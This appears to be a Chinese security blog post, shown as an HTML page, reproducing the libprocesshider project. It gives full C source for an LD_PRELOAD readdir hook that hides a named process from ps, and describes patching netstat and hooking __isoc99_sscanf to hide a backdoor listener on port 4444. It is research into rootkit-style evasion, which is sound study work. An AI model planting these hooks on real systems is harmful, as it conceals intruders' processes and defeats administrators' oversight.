@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="本文首发与先知 进程隐藏前两天逛github时, 看到了这个进程隐藏的项目, 感觉挺有意思的, 简单复现分析一下, 并写了个差不多的用来隐藏网络信息的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux下进程隐藏的一些研究">
+<meta property="og:url" content="http://example.com/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/index.html">
+<meta property="og:site_name" content="happi0">
+<meta property="og:description" content="本文首发与先知 进程隐藏前两天逛github时, 看到了这个进程隐藏的项目, 感觉挺有意思的, 简单复现分析一下, 并写了个差不多的用来隐藏网络信息的">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/open1.jpg">
+<meta property="og:image" content="http://example.com/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/open2.jpg">
+<meta property="og:image" content="http://example.com/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/open3.jpg">
+<meta property="og:image" content="http://example.com/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/opendir1.jpg">
+<meta property="og:image" content="http://example.com/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/opendir2.jpg">
+<meta property="og:image" content="http://example.com/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/opendir3.jpg">
+<meta property="og:image" content="http://example.com/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/opendir4.jpg">
+<meta property="og:image" content="http://example.com/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/res1.jpg">
+<meta property="og:image" content="http://example.com/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/res2.jpg">
+<meta property="og:image" content="http://example.com/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/res3.jpg">
+<meta property="og:image" content="http://example.com/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/net1.jpg">
+<meta property="og:image" content="http://example.com/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/res4.jpg">
+<meta property="article:published_time" content="2022-07-19T08:16:31.000Z">
+<meta property="article:modified_time" content="2022-07-19T08:22:22.370Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="linux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/open1.jpg">
+
+<link rel="canonical" href="http://example.com/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>linux下进程隐藏的一些研究 | happi0</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">happi0</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="happi0">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          linux下进程隐藏的一些研究
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-07-19 16:16:31 / Modified: 16:22:22" itemprop="dateCreated datePublished" datetime="2022-07-19T16:16:31+08:00">2022-07-19</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本文首发与<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11536">先知</a></p>
+<h2 id="进程隐藏"><a href="#进程隐藏" class="headerlink" title="进程隐藏"></a>进程隐藏</h2><p>前两天逛github时, 看到了这个<a target="_blank" rel="noopener" href="https://github.com/gianlucaborello/libprocesshider">进程隐藏的项目</a>,</p>
+<p>感觉挺有意思的, 简单复现分析一下, 并写了个差不多的用来隐藏网络信息的</p>
+<span id="more"></span>
+
+<h4 id="ps进程隐藏"><a href="#ps进程隐藏" class="headerlink" title="ps进程隐藏"></a>ps进程隐藏</h4><h5 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h5><p>得到ps源码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://gitlab.com/procps-ng/procps.git</span><br></pre></td></tr></table></figure>
+
+<p>关闭内核的地址随机化</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c <span class="string">&quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>编译</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./autogen.sh &amp;&amp; ./configure CFLAGS=<span class="string">&quot;-ggdb&quot;</span> LDFLAGS=<span class="string">&quot;-ggdb&quot;</span> --prefix=<span class="variable">$PWD</span> ;make clean; make -j12 ;make install</span><br></pre></td></tr></table></figure>
+
+<h5 id="ps逻辑的分析"><a href="#ps逻辑的分析" class="headerlink" title="ps逻辑的分析"></a>ps逻辑的分析</h5><p>大概思路为:</p>
+<p>打开<code>/proc</code>文件夹, 根据<code>pid</code>遍历, 读取<code>/proc/pid/status</code>, <code>/proc/pid/stat</code>, <code>/proc/pid/cmdline</code></p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>首先读取<code>/proc/self/status</code>, 读取自己的一些信息<br><img src="/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/open1.jpg"></p>
+<p>然后读取<code>/proc/sys/kernel/pid_max</code>, 读取最大的pid</p>
+<p><img src="/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/open2.jpg"></p>
+<p>然后读取<code>/proc/uptime</code>, 显示开机时间</p>
+<p><img src="/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/open3.jpg"></p>
+<p>然后<code>readdir</code>读取<code>PT</code>, 得到<code>ent</code>结构体</p>
+<p>这里可以在<a target="_blank" rel="noopener" href="https://linux.die.net/man/3/readdir">linux手册</a>上看到该结构体信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct dirent &#123;</span><br><span class="line">    ino_t          d_ino;       /* inode number */</span><br><span class="line">    off_t          d_off;       /* offset to the next dirent */</span><br><span class="line">    unsigned short d_reclen;    /* length of this record */</span><br><span class="line">    unsigned char  d_type;      /* type of file; not supported</span><br><span class="line">                                   by all file system types */</span><br><span class="line">    char           d_name[256]; /* filename */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>这里只关心<code>filename</code>, 看到这里<code>filename</code>为4</p>
+<p><img src="/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/opendir1.jpg"></p>
+<p>然后紧接着把<code>ent -&gt; d_name</code>给<code>p -&gt; tgid</code>, 再用<code>snprintf</code>拼接给<code>path</code>得到读取proc信息的绝对路径</p>
+<p><img src="/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/opendir2.jpg"></p>
+<p>尝试打开<code>/proc/4/stat</code></p>
+<p><img src="/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/opendir3.jpg"></p>
+<p>读取<code>/proc/4/stat</code>, 这里用<code>cat</code>读一下, 看一下内容是否相同,</p>
+<p>相差不大, 说明是正确的, 内容也可能不会完全相同, 因为进程的信息是随时变化的</p>
+<p><img src="/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/opendir4.jpg"></p>
+<h3 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h3><p>链接, <a target="_blank" rel="noopener" href="https://github.com/gianlucaborello/libprocesshider">https://github.com/gianlucaborello/libprocesshider</a></p>
+<p>这里使用<code>LD_PRELOAD</code>，可以理解为覆盖原有的函数</p>
+<p>其实他的思路就是hook<code>readdir</code>函数, 使得<code>process_name</code>和我们的后门一样时, 跳过不读, 从而实现进程隐藏</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Every process with this name will be excluded</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* process_to_filter = <span class="string">&quot;ping&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a directory name given a DIR* handle</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">get_dir_name</span><span class="params">(DIR* dirp, <span class="type">char</span>* buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = dirfd(dirp);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> tmp[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(tmp, <span class="keyword">sizeof</span>(tmp), <span class="string">&quot;/proc/self/fd/%d&quot;</span>, fd);</span><br><span class="line">    <span class="type">ssize_t</span> ret = readlink(tmp, buf, size);</span><br><span class="line">    <span class="keyword">if</span>(ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buf[ret] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a process name given its pid</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">get_process_name</span><span class="params">(<span class="type">char</span>* pid, <span class="type">char</span>* buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strspn</span>(pid, <span class="string">&quot;0123456789&quot;</span>) != <span class="built_in">strlen</span>(pid)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> tmp[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(tmp, <span class="keyword">sizeof</span>(tmp), <span class="string">&quot;/proc/%s/stat&quot;</span>, pid);</span><br><span class="line"> </span><br><span class="line">    FILE* f = fopen(tmp, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fgets(tmp, <span class="keyword">sizeof</span>(tmp), f) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        fclose(f);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(f);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> unused;</span><br><span class="line">    <span class="built_in">sscanf</span>(tmp, <span class="string">&quot;%d (%[^)]s&quot;</span>, &amp;unused, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DECLARE_READDIR(dirent, readdir)                                \</span></span><br><span class="line"><span class="meta">static struct dirent* (*original_##readdir)(DIR*) = NULL;               \</span></span><br><span class="line"><span class="meta">                                                                        \</span></span><br><span class="line"><span class="meta">struct dirent* readdir(DIR *dirp)                                       \</span></span><br><span class="line"><span class="meta">&#123;                                                                       \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span>(original_##readdir == NULL) &#123;                                    \</span></span><br><span class="line"><span class="meta">        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span>(original_##readdir == NULL)                                  \</span></span><br><span class="line"><span class="meta">        &#123;                                                               \</span></span><br><span class="line"><span class="meta">            fprintf(stderr, <span class="string">&quot;Error in dlsym: %s\n&quot;</span>, dlerror());         \</span></span><br><span class="line"><span class="meta">        &#125;                                                               \</span></span><br><span class="line"><span class="meta">    &#125;                                                                   \</span></span><br><span class="line"><span class="meta">                                                                        \</span></span><br><span class="line"><span class="meta">    struct dirent* dir;                                                 \</span></span><br><span class="line"><span class="meta">                                                                        \</span></span><br><span class="line"><span class="meta">    while(1)                                                            \</span></span><br><span class="line"><span class="meta">    &#123;                                                                   \</span></span><br><span class="line"><span class="meta">        dir = original_##readdir(dirp);                                 \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span>(dir) &#123;                                                       \</span></span><br><span class="line"><span class="meta">            char dir_name[256];                                         \</span></span><br><span class="line"><span class="meta">            char process_name[256];                                     \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span>(get_dir_name(dirp, dir_name, sizeof(dir_name)) &amp;&amp;        \</span></span><br><span class="line"><span class="meta">                strcmp(dir_name, <span class="string">&quot;/proc&quot;</span>) == 0 &amp;&amp;                       \</span></span><br><span class="line"><span class="meta">                get_process_name(dir-&gt;d_name, process_name) &amp;&amp;          \</span></span><br><span class="line"><span class="meta">                strcmp(process_name, process_to_filter) == 0) &#123;         \</span></span><br><span class="line"><span class="meta">                continue;                                               \</span></span><br><span class="line"><span class="meta">            &#125;                                                           \</span></span><br><span class="line"><span class="meta">        &#125;                                                               \</span></span><br><span class="line"><span class="meta">        break;                                                          \</span></span><br><span class="line"><span class="meta">    &#125;                                                                   \</span></span><br><span class="line"><span class="meta">    return dir;                                                         \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"></span><br><span class="line">DECLARE_READDIR(dirent64, readdir64);</span><br><span class="line">DECLARE_READDIR(dirent, readdir);</span><br></pre></td></tr></table></figure>
+<h3 id="测试效果"><a href="#测试效果" class="headerlink" title="测试效果"></a>测试效果</h3><p>用ping命令当作后门, 测试<code>ps</code>, 找不到进程</p>
+<p><img src="/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/res1.jpg"></p>
+<p>但有个缺点, 如果是监听的话, <code>netstat</code>能看到, 只不过找不到进程和进程名而已</p>
+<p><img src="/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/res2.jpg"></p>
+<p>这里的原因其实是, 在linux中, tcp网络连接在<code>/proc/net/tcp</code>下, <code>netstat</code>只是去读取并解析而已</p>
+<p>所以上文的hook不起作用</p>
+<p><img src="/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/res3.jpg"></p>
+<p>这里可以看到, 能看到有<code>0.0.0.0:3333</code>的监听, 只不过是16进制</p>
+<p>于是这里依照上面的原理在做一个netstat的隐藏</p>
+<h2 id="netstat进程隐藏"><a href="#netstat进程隐藏" class="headerlink" title="netstat进程隐藏"></a>netstat进程隐藏</h2><h3 id="准备-1"><a href="#准备-1" class="headerlink" title="准备"></a>准备</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ecki/net-tools.git</span><br></pre></td></tr></table></figure>
+
+<p>添加调试信息并编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure.sh CFLAGS=&quot;-ggdb&quot; LDFLAGS=&quot;-ggdb&quot; --prefix=$PWD ;make clean;make -j12;rm bin;mkdir bin; install -m 0755 netstat bin;</span><br></pre></td></tr></table></figure>
+
+<h3 id="阅读源码与调试"><a href="#阅读源码与调试" class="headerlink" title="阅读源码与调试"></a>阅读源码与调试</h3><p>源码不多, 大概思路如下</p>
+<p>首先进入<code>tcp_info</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">static int tcp_info(void)</span><br><span class="line">&#123;</span><br><span class="line">    INFO_GUTS6(_PATH_PROCNET_TCP, _PATH_PROCNET_TCP6, &quot;AF INET (tcp)&quot;,</span><br><span class="line">           tcp_do_one, &quot;tcp&quot;, &quot;tcp6&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们这里先不考虑tcp6</p>
+<p>这里的<code>_PATH_PROCNET_TCP</code>, 被<code>lib/pathnames.h</code>定义为<code>#define _PATH_PROCNET_TCP &quot;/proc/net/tcp&quot;</code></p>
+<p>然后进入<code>tcp_do_one</code>, 这里读取<code>/proc/net/tcp</code>每一行的含义并解析</p>
+<p>这里用<code>sscanf</code>解析, 添加了逻辑, 如果端口为<code>4444</code>则返回, 编译测试, 成功</p>
+<p><img src="/2022/07/19/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/net1.jpg"></p>
+<h4 id="hook-1"><a href="#hook-1" class="headerlink" title="hook"></a>hook</h4><p>但是覆盖的函数不是<code>sscanf</code>, 而是<code>__isoc99_sscanf</code>, 具体在<code>&lt;stdio.h&gt;</code>中有, 这也是ida反编译出来的<code>scanf</code>名字不是<code>scanf</code>的原因</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> __isoc99_sscanf (<span class="type">const</span> <span class="type">char</span> *__restrict __s,</span><br><span class="line">                            <span class="type">const</span> <span class="type">char</span> *__restrict __format, ...) __THROW;</span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> fscanf __isoc99_fscanf</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> scanf __isoc99_scanf</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> sscanf __isoc99_sscanf</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的逻辑为, 如果有监听<code>0.0.0.0:4444</code>则返回12,</p>
+<p>这里之所以返回12是因为上层函数有一个错误检测(见上图1095行, 由于我的vim是相对行号, 在1086下面9行为原本的1095行), <code>if (num &lt; 11)</code> 输出错误提示, 所以返回12</p>
